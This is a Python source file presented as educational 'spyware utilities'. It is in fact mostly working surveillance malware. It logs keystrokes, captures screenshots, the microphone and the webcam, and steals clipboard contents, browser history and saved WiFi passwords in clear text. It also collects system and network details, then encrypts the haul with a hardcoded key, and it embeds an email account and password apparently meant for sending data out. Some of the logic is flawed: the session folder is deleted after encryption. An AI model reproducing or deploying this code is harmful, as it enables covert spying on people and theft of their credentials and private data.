"""
Spyware Utilities for Information Gathering
Educational/Study Purposes Only
"""

import subprocess
import socket
import win32clipboard
import os
import re
import logging
import pathlib
import json
import time
import cv2
import sounddevice
import shutil
import requests
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from django.conf import settings
import uuid
from datetime import datetime

# Configuration
ENCRYPTION_KEY = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='
BASE_LOG_PATH = 'C:/Users/Public/Logs/'
EMAIL_ADDRESS = 'QuiteHacker@instagram.com'
EMAIL_PASSWORD = 'QuiteHacker@2021'

def setup_logging():
    """Setup logging configuration"""
    pathlib.Path(BASE_LOG_PATH).mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=BASE_LOG_PATH + 'spyware_operations.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def logg_keys(file_path):
    """Keystroke capture function"""
    logging.basicConfig(filename=(file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    on_press = lambda Key: logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()

def take_screenshots(file_path, count=10, interval=5):
    """Take multiple screenshots"""
    screen_path = file_path + 'Screenshots\\'
    pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
    
    for x in range(count):
        try:
            pic = ImageGrab.grab()
            pic.save(screen_path + f'screenshot_{x}_{int(time.time())}.png')
            time.sleep(interval)
        except Exception as e:
            logging.error(f"Screenshot error: {e}")

def record_microphone(file_path, recordings=5, duration=10):
    """Record microphone audio"""
    fs = 44100
    for x in range(recordings):
        try:
            myrecording = sounddevice.rec(int(duration * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            write_rec(file_path + f'mic_recording_{x}_{int(time.time())}.wav', fs, myrecording)
            time.sleep(1)  # Small gap between recordings
        except Exception as e:
            logging.error(f"Microphone recording error: {e}")

def capture_webcam(file_path, count=10, interval=5):
    """Capture webcam images"""
    cam_path = file_path + 'WebcamPics\\'
    pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
    
    try:
        cam = cv2.VideoCapture(0)
        for x in range(count):
            ret, img = cam.read()
            if ret:
                file = cam_path + f'webcam_{x}_{int(time.time())}.jpg'
                cv2.imwrite(file, img)
            time.sleep(interval)
        cam.release()
        cv2.destroyAllWindows()
    except Exception as e:
        logging.error(f"Webcam capture error: {e}")

def get_network_info(file_path):
    """Get network and WiFi information"""
    try:
        with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
            commands = subprocess.Popen([
                'Netsh', 'WLAN', 'export', 'profile', f'folder={file_path}', 'key=clear',
                '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 
                'route', 'print', '&', 'netstat', '-a'
            ], stdout=network_wifi, stderr=network_wifi, shell=True)
            outs, errs = commands.communicate(timeout=60)
    except Exception as e:
        logging.error(f"Network info error: {e}")

def get_system_info(file_path):
    """Get system information"""
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        with open(file_path + 'system_info.txt', 'a') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org').text
            except requests.ConnectionError:
                public_ip = '* Ipify connection failed *'
            
            system_info.write(f'Public IP Address: {public_ip}\nPrivate IP Address: {IPAddr}\n')
            
            get_sysinfo = subprocess.Popen([
                'systeminfo', '&', 'tasklist', '&', 'sc', 'query'
            ], stdout=system_info, stderr=system_info, shell=True)
            outs, errs = get_sysinfo.communicate(timeout=15)
    except Exception as e:
        logging.error(f"System info error: {e}")

def get_clipboard_data(file_path):
    """Get clipboard data"""
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        
        with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
            clipboard_info.write('Clipboard Data: \n' + str(pasted_data))
    except Exception as e:
        logging.error(f"Clipboard error: {e}")

def get_browser_history(file_path):
    """Get browser history"""
    try:
        browser_history = []
        bh_user = bh.get_username()
        db_path = bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history.extend((bh_user, db_path, hist))
        
        with open(file_path + 'browser.txt', 'a') as browser_txt:
            browser_txt.write(json.dumps(browser_history))
    except Exception as e:
        logging.error(f"Browser history error: {e}")

def encrypt_files(file_path):
    """Encrypt collected files"""
    files_to_encrypt = [
        'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 
        'browser.txt', 'key_logs.txt'
    ]
    
    # Add XML files
    regex = re.compile(r'.+\.xml$')
    for dirpath, dirnames, filenames in os.walk(file_path):
        files_to_encrypt.extend([file for file in filenames if regex.match(file)])
    
    fernet = Fernet(ENCRYPTION_KEY)
    
    for file in files_to_encrypt:
        try:
            file_full_path = file_path + file
            if os.path.exists(file_full_path):
                with open(file_full_path, 'rb') as plain_text:
                    data = plain_text.read()
                encrypted = fernet.encrypt(data)
                with open(file_path + 'e_' + file, 'ab') as hidden_data:
                    hidden_data.write(encrypted)
                os.remove(file_full_path)
        except Exception as e:
            logging.error(f"Encryption error for {file}: {e}")

def create_spyware_session(suspect_id=None, operation_name="Surveillance Operation"):
    """
    Main function to start information gathering
    Returns session ID for tracking
    """
    setup_logging()
    
    # Create unique session directory
    session_id = str(uuid.uuid4())
    session_path = f"{BASE_LOG_PATH}session_{session_id}/"
    pathlib.Path(session_path).mkdir(parents=True, exist_ok=True)
    
    logging.info(f"Starting spyware session: {session_id} for suspect: {suspect_id}")
    
    # Gather initial system information
    get_network_info(session_path)
    get_system_info(session_path)
    get_clipboard_data(session_path)
    get_browser_history(session_path)
    
    # Start parallel processes for continuous monitoring
    processes = []
    
    # Start keylogger
    p1 = Process(target=logg_keys, args=(session_path,))
    p1.start()
    processes.append(p1)
    
    # Start screenshot capture
    p2 = Process(target=take_screenshots, args=(session_path,))
    p2.start()
    processes.append(p2)
    
    # Start microphone recording
    p3 = Process(target=record_microphone, args=(session_path,))
    p3.start()
    processes.append(p3)
    
    # Start webcam capture
    p4 = Process(target=capture_webcam, args=(session_path,))
    p4.start()
    processes.append(p4)
    
    # Monitor for specified duration (5 minutes default)
    monitor_duration = 300  # seconds
    
    # Wait for completion or timeout
    for process in processes:
        process.join(timeout=monitor_duration)
        if process.is_alive():
            process.terminate()
    
    # Encrypt collected data
    encrypt_files(session_path)
    
    # Clean up original files
    try:
        shutil.rmtree(session_path)
    except Exception as e:
        logging.error(f"Cleanup error: {e}")
    
    logging.info(f"Spyware session completed: {session_id}")
    
    return {
        'session_id': session_id,
        'status': 'completed',
        'suspect_id': suspect_id,
        'operation_name': operation_name,
        'timestamp': datetime.now().isoformat()
    }

def decrypt_collected_data(session_id, decryption_key=None):
    """
    Decrypt data collected from a session
    """
    if decryption_key is None:
        decryption_key = ENCRYPTION_KEY
    
    session_path = f"{BASE_LOG_PATH}session_{session_id}/"
    pathlib.Path(session_path).mkdir(parents=True, exist_ok=True)
    
    encrypted_files = [
        'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt',
        'e_browser.txt', 'e_key_logs.txt'
    ]
    
    # Add encrypted XML files
    regex = re.compile(r'e_.+\.xml$')
    for dirpath, dirnames, filenames in os.walk(session_path):
        encrypted_files.extend([file for file in filenames if regex.match(file)])
    
    fernet = Fernet(decryption_key)
    
    decrypted_files = []
    
    for file in encrypted_files:
        try:
            file_path = session_path + file
            if os.path.exists(file_path):
                with open(file_path, 'rb') as encrypted_file:
                    data = encrypted_file.read()
                decrypted = fernet.decrypt(data)
                original_filename = file[2:]  # Remove 'e_' prefix
                with open(session_path + original_filename, 'ab') as decrypted_file:
                    decrypted_file.write(decrypted)
                decrypted_files.append(original_filename)
                os.remove(file_path)
        except Exception as e:
            logging.error(f"Decryption error for {file}: {e}")
    
    return {
        'session_id': session_id,
        'decrypted_files': decrypted_files,
        'status': 'decryption_completed' if decrypted_files else 'no_files_decrypted'
    }